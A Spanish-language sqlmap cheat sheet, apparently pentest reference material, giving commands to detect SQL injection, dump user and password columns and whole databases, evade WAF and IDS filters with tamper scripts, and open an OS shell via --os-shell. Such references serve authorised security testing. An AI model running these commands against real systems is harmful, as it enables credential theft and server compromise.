# Sqlmap Cheat Sheet

Comandos rápidos para la detección y explotación automatizada de inyecciones SQL (SQLi) con Sqlmap.

---

## 1. Escaneo y Detección Básica

* **Escaneo estándar de petición GET**:
  ```bash
  sqlmap -u "http://dominio.local/index.php?id=1" --batch
  ```
  *(La opción `--batch` automatiza las respuestas por defecto del asistente)*
* **Escaneo mediante archivo de petición web (Burp Suite)**:
  Guardar petición en un archivo (e.g. `request.req`):
  ```bash
  sqlmap -r request.req --batch
  ```

---

## 2. Parámetros de Optimización y Rendimiento

* **Modificar nivel y riesgo (Defectos: Level 1, Risk 1)**:
  * `--level=5`: Amplía las pruebas buscando inyecciones en cabeceras HTTP (User-Agent, Referer, Cookies).
  * `--risk=3`: Habilita pruebas basadas en consultas pesadas (OR) con posible impacto en el rendimiento de la BD.
  ```bash
  sqlmap -u "http://dominio.local/index.php?id=1" --level=5 --risk=3
  ```
* **Multiprocesamiento (Hilos)**:
  ```bash
  sqlmap -u "http://dominio.local/index.php?id=1" --threads=10
  ```
* **Especificar motor de base de datos (DBMS)**:
  ```bash
  sqlmap -u "http://dominio.local/index.php?id=1" --dbms=mysql
  ```

---

## 3. Enumeración y Extracción de Datos

Tras la detección de una inyección válida, proceder con la extracción estructurada:

1. **Listar bases de datos disponibles**:
   ```bash
   sqlmap -r request.req --dbs
   ```
2. **Listar tablas de una base de datos específica (`-D`)**:
   ```bash
   sqlmap -r request.req -D db_name --tables
   ```
3. **Listar columnas de una tabla específica (`-T`)**:
   ```bash
   sqlmap -r request.req -D db_name -T users --columns
   ```
4. **Volcar registros de columnas seleccionadas (`-C`)**:
   ```bash
   sqlmap -r request.req -D db_name -T users -C username,password --dump
   ```
5. **Volcar base de datos completa**:
   ```bash
   sqlmap -r request.req -D db_name --dump-all
   ```

---

## 4. Evasión de WAF e IDS (Tamper Scripts)

Uso de scripts de ofuscación (*tamper*) para eludir firmas de detección.

* **Listar scripts tamper disponibles**:
  ```bash
  sqlmap --list-tampers
  ```
* **Uso de scripts tamper comunes**:
  * `space2comment`: Reemplaza espacios por comentarios inline (`/**/`).
  * `charencode`: Codifica caracteres en formato URL.
  * `randomcase`: Modifica la capitalización de palabras clave (e.g. `SeLeCt`).
  ```bash
  sqlmap -u "http://dominio.local/index.php?id=1" --tamper=space2comment,randomcase
  ```

---

## 5. Ejecución de Comandos (RCE)

Requiere privilegios de lectura/escritura y soporte del DBMS para ejecución.

* **Lanzar shell interactiva del sistema operativo**:
  ```bash
  sqlmap -r request.req --os-shell
  ```
* **Ejecutar comando único**:
  ```bash
  sqlmap -r request.req --os-cmd="whoami"
  ```
